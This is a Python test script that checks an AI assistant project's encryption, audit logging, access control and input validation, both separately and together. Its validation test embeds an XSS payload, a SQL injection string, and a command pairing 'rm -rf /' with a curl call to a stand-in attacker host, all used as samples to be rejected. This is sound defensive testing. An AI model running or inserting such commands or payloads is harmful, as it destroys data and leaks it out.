#!/usr/bin/env python3
"""
Test Security Integration
Tests all 4 critical security frameworks working together
"""

import sys
import os
import json
import tempfile
import time
from pathlib import Path

# Add the ai_assistant directory to the path
sys.path.insert(0, str(Path(__file__).parent / "ai_assistant"))

def test_security_frameworks():
    """Test all security frameworks integration"""
    print("🔒 Testing Critical Security Frameworks Integration\n")
    
    results = {
        "encryption": False,
        "audit_logging": False, 
        "access_control": False,
        "input_validation": False,
        "integration": False
    }
    
    # 1. Test Encryption System
    print("1️⃣ Testing Encryption System...")
    try:
        from ai_assistant.core.encryption import SecureEncryption, DatabaseEncryption
        
        # Test basic encryption
        encryptor = SecureEncryption()
        test_data = "This is sensitive data that needs protection!"
        encrypted = encryptor.encrypt(test_data)
        decrypted = encryptor.decrypt(encrypted)
        
        assert decrypted == test_data, "Encryption/decryption failed"
        
        # Test database encryption
        db_enc = DatabaseEncryption()
        encrypted_field = db_enc.encrypt_field("user_data", "sensitive information")
        decrypted_field = db_enc.decrypt_field("user_data", encrypted_field)
        
        assert decrypted_field == "sensitive information", "Database encryption failed"
        
        results["encryption"] = True
        print("   ✅ Encryption system working correctly")
        
    except Exception as e:
        print(f"   ❌ Encryption test failed: {e}")
    
    # 2. Test Audit Logging
    print("\n2️⃣ Testing Audit Logging System...")
    try:
        from ai_assistant.core.audit_logger import AuditLogger, EventType, SeverityLevel
        
        # Create test audit logger
        with tempfile.TemporaryDirectory() as temp_dir:
            audit_logger = AuditLogger(
                log_file=str(Path(temp_dir) / "test_audit.db"),
                enable_encryption=False  # Test without encryption first
            )
            
            # Test logging events
            audit_logger.log_event(EventType.USER_ACTION, "Test user action", "127.0.0.1")
            audit_logger.log_security_event(EventType.FAILED_LOGIN, "Test failed login", "192.168.1.100", SeverityLevel.HIGH)
            
            # Test retrieving events
            events = audit_logger.get_recent_events(limit=10)
            assert len(events) >= 2, "Events not logged correctly"
            
            results["audit_logging"] = True
            print("   ✅ Audit logging system working correctly")
            
    except Exception as e:
        print(f"   ❌ Audit logging test failed: {e}")
    
    # 3. Test Access Control
    print("\n3️⃣ Testing Access Control System...")
    try:
        from ai_assistant.core.access_control import AccessControlManager, Permission, Role
        
        # Create test access control manager
        with tempfile.TemporaryDirectory() as temp_dir:
            access_control = AccessControlManager(
                config_file=str(Path(temp_dir) / "test_access.json")
            )
            
            # Test user and role management
            access_control.add_user("test_user", Role.USER)
            access_control.add_user("test_admin", Role.ADMIN)
            
            # Test permissions
            user_can_read = access_control.check_permission("test_user", Permission.READ_MEMORY)
            admin_can_write = access_control.check_permission("test_admin", Permission.WRITE_MEMORY)
            user_can_admin = access_control.check_permission("test_user", Permission.ADMIN_ACCESS)
            
            assert user_can_read, "User should have read access"
            assert admin_can_write, "Admin should have write access"
            assert not user_can_admin, "User should not have admin access"
            
            results["access_control"] = True
            print("   ✅ Access control system working correctly")
            
    except Exception as e:
        print(f"   ❌ Access control test failed: {e}")
    
    # 4. Test Input Validation
    print("\n4️⃣ Testing Input Validation System...")
    try:
        from ai_assistant.core.input_validation import InputValidator, ValidationRule
        
        validator = InputValidator()
        
        # Test API input validation
        valid_input = {"message": "Hello, how are you?", "user": "test_user"}
        invalid_input = {"message": "<script>alert('xss')</script>", "user": "admin'; DROP TABLE users; --"}
        
        valid_result = validator.validate_api_input("/api/chat", valid_input)
        invalid_result = validator.validate_api_input("/api/chat", invalid_input)
        
        assert valid_result["is_valid"], "Valid input should pass validation"
        assert not invalid_result["is_valid"], "Invalid input should fail validation"
        
        # Test command sanitization
        malicious_command = "rm -rf / && curl http://evil.com/steal"
        sanitized = validator.sanitize_command(malicious_command)
        
        assert "rm -rf" not in sanitized, "Dangerous commands should be sanitized"
        
        results["input_validation"] = True
        print("   ✅ Input validation system working correctly")
        
    except Exception as e:
        print(f"   ❌ Input validation test failed: {e}")
    
    # 5. Test Integration
    print("\n5️⃣ Testing Security Integration...")
    try:
        from ai_assistant.core.encryption import SecureEncryption
        from ai_assistant.core.audit_logger import AuditLogger, EventType
        from ai_assistant.core.access_control import AccessControlManager, Permission
        from ai_assistant.core.input_validation import InputValidator
        
        # Create integrated security test
        with tempfile.TemporaryDirectory() as temp_dir:
            # Initialize all systems
            encryptor = SecureEncryption()
            audit_logger = AuditLogger(
                log_file=str(Path(temp_dir) / "integration_audit.db"),
                enable_encryption=True,
                encryptor=encryptor
            )
            access_control = AccessControlManager(
                config_file=str(Path(temp_dir) / "integration_access.json")
            )
            validator = InputValidator()
            
            # Simulate secure request processing
            user_input = {"message": "Process this securely", "user_id": "secure_user"}
            
            # 1. Validate input
            validation_result = validator.validate_api_input("/api/secure", user_input)
            assert validation_result["is_valid"], "Secure input should be valid"
            
            # 2. Check access permissions
            access_control.add_user("secure_user", "user")
            has_access = access_control.check_permission("secure_user", Permission.USE_AI)
            assert has_access, "User should have AI access"
            
            # 3. Log the secure operation
            audit_logger.log_event(EventType.API_ACCESS, "Secure API access", "127.0.0.1", 
                                 details={"validated": True, "authorized": True})
            
            # 4. Encrypt sensitive response
            response_data = "This is a secure response with sensitive information"
            encrypted_response = encryptor.encrypt(response_data)
            
            # Verify complete workflow
            assert encrypted_response != response_data, "Response should be encrypted"
            decrypted_response = encryptor.decrypt(encrypted_response)
            assert decrypted_response == response_data, "Decryption should work"
            
            # Verify audit trail
            recent_events = audit_logger.get_recent_events(limit=1)
            assert len(recent_events) > 0, "Security events should be logged"
            
            results["integration"] = True
            print("   ✅ Security integration working correctly")
            
    except Exception as e:
        print(f"   ❌ Security integration test failed: {e}")
    
    # Final Results
    print("\n" + "="*60)
    print("🔒 SECURITY FRAMEWORKS TEST RESULTS")
    print("="*60)
    
    total_tests = len(results)
    passed_tests = sum(results.values())
    
    for test_name, passed in results.items():
        status = "✅ PASS" if passed else "❌ FAIL"
        print(f"{test_name.replace('_', ' ').title():.<40} {status}")
    
    print(f"\nOverall Result: {passed_tests}/{total_tests} tests passed")
    
    if passed_tests == total_tests:
        print("🎉 ALL CRITICAL SECURITY FRAMEWORKS ARE OPERATIONAL!")
        print("\n🛡️ Your AI Assistant now has enterprise-grade security:")
        print("   • End-to-end encryption for sensitive data")
        print("   • Comprehensive audit logging with threat detection")  
        print("   • Role-based access control with fine-grained permissions")
        print("   • Advanced input validation preventing injection attacks")
        print("   • Fully integrated security workflow")
        return True
    else:
        print("⚠️ Some security frameworks need attention.")
        print("Please check the failed tests and resolve any issues.")
        return False

if __name__ == "__main__":
    success = test_security_frameworks()
    exit(0 if success else 1)